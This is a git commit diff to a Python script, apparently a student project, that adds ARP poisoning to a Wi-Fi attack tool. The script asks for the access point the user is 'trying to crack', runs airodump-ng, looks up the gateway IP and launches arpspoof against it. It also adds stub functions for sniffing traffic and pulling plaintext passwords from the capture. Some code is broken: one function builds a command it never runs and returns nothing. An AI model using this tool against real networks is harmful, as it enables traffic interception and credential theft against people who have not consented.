9d4863f7c6af35ed1647ca14a81789cfaffe2d28
Pranav Arora <pranav.arora@utexas.edu>
2019-12-03 19:16:58 -0600

    Implement arp poisoning

--- source.py
+++ source.py
@@ -18,7 +18,7 @@ def getBSSIDInfo(essid, interface_name):
     try: 
         cmd = "airodump-ng {} --essid {} -w allnet2".format(interface_name, essid)
     except KeyboardInterrupt:
-		print("obtained BSSID info")
+        print("obtained BSSID info")
 
 def crackWEP(bssid, essid):
     print("cracking wep")
@@ -31,10 +31,36 @@ def connectToNetwork():
     # start wireless card again
     #   
 
+def getGatewayIP():
+    with subprocess.Popen(["ip", "route"], stdout=subprocess.PIPE) as proc:
+        out, _ = proc.communicate()
+        for line in out.decode().split('\n'):
+            if line.split()[0] == "default":
+                return line.split()[2]
+        raise Exception("Gateway IP not found.")
+
+def sniffTraffic():
+    # Log traffic to a file (i.e. dsniff -w dumpfile.pcap)
+    pass
+
+def parsePasswords():
+    # Parse log file for plaintext passwords
+    pass
+
+def arpPoison(interface_name, host):
+    arpSpoofProc = subprocess.Popen(["arpspoof", "-i", interface_name, host], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    return arpSpoofProc
+
 if __name__ == "__main__":
     interface = input("Please enter the interface name of your wireless network reader. You can find this by running ifconfig. It should be a wlan: ")
     monitorModeInterface = setupNetworkReader(interface)
     essid = input("Enter the ESSID (network name) of the access point you are trying to crack: ")
-    getBSSIDInfo(essid, monitorModeInterface)
-    
-    print(bssid)
+    bssid = getBSSIDInfo(essid, monitorModeInterface)
+
+
+
+    gatewayIP = getGatewayIP()
+    arpSpoofProc = arpPoison(monitorModeInterface, gatewayIP)
+    sniffTraffic()
+    parsePasswords()
+    arpSpoofProc.terminate()
